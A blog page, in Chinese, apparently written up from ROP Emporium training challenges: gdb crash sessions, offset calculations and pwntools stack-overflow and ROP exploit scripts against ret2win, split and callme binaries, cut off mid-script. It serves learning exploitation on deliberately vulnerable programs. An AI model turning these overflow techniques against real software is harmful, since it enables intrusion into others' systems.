@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PWN," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ret2win32 Write up0x00 前言群里大佬发的网站，花点时间做下">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP_Emporium(更新中...)">
+<meta property="og:url" content="http://yoursite.com/2018/03/17/ROP-Emporium/index.html">
+<meta property="og:site_name" content="Mask&#39;s Blog">
+<meta property="og:description" content="ret2win32 Write up0x00 前言群里大佬发的网站，花点时间做下">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-17T14:31:38.055Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ROP_Emporium(更新中...)">
+<meta name="twitter:description" content="ret2win32 Write up0x00 前言群里大佬发的网站，花点时间做下">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/17/ROP-Emporium/"/>
+
+
+
+
+
+  <title>ROP_Emporium(更新中...) | Mask's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Mask's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/17/ROP-Emporium/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Mask">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mask's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ROP_Emporium(更新中...)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-17T22:22:11+08:00">
+                2018-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="ret2win32-Write-up"><a href="#ret2win32-Write-up" class="headerlink" title="ret2win32 Write up"></a>ret2win32 Write up</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>群里大佬发的网站，花点时间做下</p>
+<a id="more"></a>
+<h2 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">char *pwnme()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+0h] [bp-28h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 32u);</span><br><span class="line">  puts(&quot;For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?&quot;);</span><br><span class="line">  puts(&quot;You there madam, may I have your input please? And don&apos;t worry about null bytes, we&apos;re using fgets!\n&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;);</span><br><span class="line">  return fgets(&amp;s, 50, stdin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单的栈溢出，gdb调试<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/ret2win32$ gdb ./ret2win32 </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./ret2win32...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ pattern create 50</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/mask/ROP_Emporium/ret2win32/ret2win32 </span><br><span class="line">ret2win by ROP Emporium</span><br><span class="line">32bits</span><br><span class="line"></span><br><span class="line">For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;</span><br><span class="line">What could possibly go wrong?</span><br><span class="line">You there madam, may I have your input please? And don&apos;t worry about null bytes, we&apos;re using fgets!</span><br><span class="line"></span><br><span class="line">&gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xbffff010 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0xb7fbb87c --&gt; 0x0 </span><br><span class="line">ESI: 0xb7fba000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xb7fba000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0x41304141 (&apos;AA0A&apos;)</span><br><span class="line">ESP: 0xbffff040 --&gt; 0xb7fb0062 --&gt; 0xe65400e </span><br><span class="line">EIP: 0x41414641 (&apos;AFAA&apos;)</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41414641</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff040 --&gt; 0xb7fb0062 --&gt; 0xe65400e </span><br><span class="line">0004| 0xbffff044 --&gt; 0xbffff060 --&gt; 0x1 </span><br><span class="line">0008| 0xbffff048 --&gt; 0x0 </span><br><span class="line">0012| 0xbffff04c --&gt; 0xb7e20637 (&lt;__libc_start_main+247&gt;:	addesp,0x10)</span><br><span class="line">0016| 0xbffff050 --&gt; 0xb7fba000 --&gt; 0x1b1db0 </span><br><span class="line">0020| 0xbffff054 --&gt; 0xb7fba000 --&gt; 0x1b1db0 </span><br><span class="line">0024| 0xbffff058 --&gt; 0x0 </span><br><span class="line">0028| 0xbffff05c --&gt; 0xb7e20637 (&lt;__libc_start_main+247&gt;:	addesp,0x10)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414641 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41414641</span><br><span class="line">1094796865 found at offset: 44</span><br><span class="line">gdb-peda$ q</span><br></pre></td></tr></table></figure>
+<p>然后需要跳转的地址为<code>0x8048659</code><br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:08048659 ret2win proc near</span><br><span class="line">.text:08048659 pushebp</span><br><span class="line">.text:0804865A mov ebp, esp</span><br><span class="line">.text:0804865C sub esp, 8</span><br><span class="line">.text:0804865F sub esp, 0Ch</span><br><span class="line">.text:08048662 pushoffset aThankYouHereSY ; &quot;Thank you! Here&apos;s your flag:&quot;</span><br><span class="line">.text:08048667 call_printf</span><br><span class="line">.text:0804866C add esp, 10h</span><br><span class="line">.text:0804866F sub esp, 0Ch</span><br><span class="line">.text:08048672 pushoffset command  ; &quot;/bin/cat flag.txt&quot;</span><br><span class="line">.text:08048677 call_system</span><br><span class="line">.text:0804867C add esp, 10h</span><br><span class="line">.text:0804867F nop</span><br><span class="line">.text:08048680 leave</span><br><span class="line">.text:08048681 retn</span><br><span class="line">.text:08048681 ret2win endp</span><br></pre></td></tr></table></figure>
+<p>那么偏移为44</p>
+<h2 id="0x02-编写exp"><a href="#0x02-编写exp" class="headerlink" title="0x02 编写exp"></a>0x02 编写exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">io = process(&apos;./ret2win32&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*44</span><br><span class="line"></span><br><span class="line">payload += p32(0x8048659)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>​    </p>
+<p>执行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/ret2win32$ vim exp.py </span><br><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/ret2win32$ python exp.py </span><br><span class="line">[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.</span><br><span class="line">[+] Starting local process &apos;./ret2win32&apos;: pid 6385</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">ret2win by ROP Emporium</span><br><span class="line">32bits</span><br><span class="line"></span><br><span class="line">For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;</span><br><span class="line">What could possibly go wrong?</span><br><span class="line">You there madam, may I have your input please? And don&apos;t worry about null bytes, we&apos;re using fgets!</span><br><span class="line"></span><br><span class="line">&gt; $ </span><br><span class="line">Thank you! Here&apos;s your flag:ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="ret2win-64"><a href="#ret2win-64" class="headerlink" title="ret2win 64"></a>ret2win 64</h1><h2 id="0x00-前言-1"><a href="#0x00-前言-1" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>和32位的思路一样</p>
+<h2 id="0x01-编写exp"><a href="#0x01-编写exp" class="headerlink" title="0x01 编写exp"></a>0x01 编写exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">io = process(&apos;./ret2win&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*40</span><br><span class="line"></span><br><span class="line">payload += p64(0x400811)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>​    </p>
+<p>运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/ret2win$ vim exp.py</span><br><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/ret2win$ python exp.py </span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">To disable this functionality, set the contents of /home/mask/.pwntools-cache/update to &apos;never&apos;.</span><br><span class="line">[*] You have the latest version of Pwntools (3.12.0.dev0)</span><br><span class="line">[+] Starting local process &apos;./ret2win&apos;: pid 13553</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">ret2win by ROP Emporium</span><br><span class="line">64bits</span><br><span class="line"></span><br><span class="line">For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;</span><br><span class="line">What could possibly go wrong?</span><br><span class="line">You there madam, may I have your input please? And don&apos;t worry about null bytes, we&apos;re using fgets!</span><br><span class="line"></span><br><span class="line">&gt; Thank you! Here&apos;s your flag:ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Split-32"><a href="#Split-32" class="headerlink" title="Split 32"></a>Split 32</h1><h2 id="0x00-前言-2"><a href="#0x00-前言-2" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>继续刷</p>
+<h2 id="0x01-源码分析-1"><a href="#0x01-源码分析-1" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">char *pwnme()</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+0h] [bp-28h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 32u);</span><br><span class="line">  puts(&quot;Contriving a reason to ask user for data...&quot;);</span><br><span class="line">  printf(&quot;&gt; &quot;);</span><br><span class="line">  return fgets(&amp;s, 96, stdin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>存在栈溢出，然后存在一个usefulFunction，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int usefulFunction()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;/bin/ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是调用的不是我们想要的<code>cat</code>，那么凭直觉，应该在其他地方，搜一下<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0804A030 public usefulString</span><br><span class="line">.data:0804A030 usefulStringdb &apos;/bin/cat flag.txt&apos;,0</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-调试"><a href="#0x02-调试" class="headerlink" title="0x02 调试"></a>0x02 调试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/split/split32$ gdb ./split32 </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./split32...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ pattern create 50</span><br><span class="line">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA&apos;</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/mask/ROP_Emporium/split/split32/split32 </span><br><span class="line">split by ROP Emporium</span><br><span class="line">32bits</span><br><span class="line"></span><br><span class="line">Contriving a reason to ask user for data...</span><br><span class="line">&gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xbffff010 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0xb7fbb87c --&gt; 0x0 </span><br><span class="line">ESI: 0xb7fba000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xb7fba000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0x41304141 (&apos;AA0A&apos;)</span><br><span class="line">ESP: 0xbffff040 --&gt; 0xa4162 (&apos;bA\n&apos;)</span><br><span class="line">EIP: 0x41414641 (&apos;AFAA&apos;)</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41414641</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff040 --&gt; 0xa4162 (&apos;bA\n&apos;)</span><br><span class="line">0004| 0xbffff044 --&gt; 0xbffff060 --&gt; 0x1 </span><br><span class="line">0008| 0xbffff048 --&gt; 0x0 </span><br><span class="line">0012| 0xbffff04c --&gt; 0xb7e20637 (&lt;__libc_start_main+247&gt;:	addesp,0x10)</span><br><span class="line">0016| 0xbffff050 --&gt; 0xb7fba000 --&gt; 0x1b1db0 </span><br><span class="line">0020| 0xbffff054 --&gt; 0xb7fba000 --&gt; 0x1b1db0 </span><br><span class="line">0024| 0xbffff058 --&gt; 0x0 </span><br><span class="line">0028| 0xbffff05c --&gt; 0xb7e20637 (&lt;__libc_start_main+247&gt;:	addesp,0x10)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414641 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41414641</span><br><span class="line">1094796865 found at offset: 44</span><br></pre></td></tr></table></figure>
+<p>计算出了偏移为44，开始编写exp</p>
+<h2 id="0x03-编写exp"><a href="#0x03-编写exp" class="headerlink" title="0x03 编写exp"></a>0x03 编写exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">io = process(&apos;./split32&apos;)</span><br><span class="line"></span><br><span class="line">payload = &apos;A&apos;*44</span><br><span class="line"></span><br><span class="line">payload += p32(0x08048657) #system地址</span><br><span class="line"></span><br><span class="line">payload += p32(0x0804A030) #参数/bin/cat地址</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/ROP_Emporium/split/split32$ python exp.py </span><br><span class="line">[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.</span><br><span class="line">[+] Starting local process &apos;./split32&apos;: pid 6642</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">split by ROP Emporium</span><br><span class="line">32bits</span><br><span class="line"></span><br><span class="line">Contriving a reason to ask user for data...</span><br><span class="line">&gt; ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="callme32-writeup"><a href="#callme32-writeup" class="headerlink" title="callme32 writeup"></a>callme32 writeup</h1><h2 id="0x00-前言-3"><a href="#0x00-前言-3" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>我擦，这不就是之前ctf群的入群题目嘛！！！(((φ(◎ロ◎;)φ)))</p>
+<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>分析过程和之前那道题一样，这里直接写exp了：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&quot;./callme32&quot;)</span><br><span class="line"></span><br><span class="line">callme_one_plt = 0x80485c0</span><br><span class="line">callme_two_plt = 0x8048620</span><br><span class="line">callme_three_plt = 0x80485b0</span><br><span class="line">pppr = 0x80488a9</span><br><span class="line"></span><br><span class="line">payload = &apos;&apos;</span><br><span class="line"></span><br><span class="line">payload += 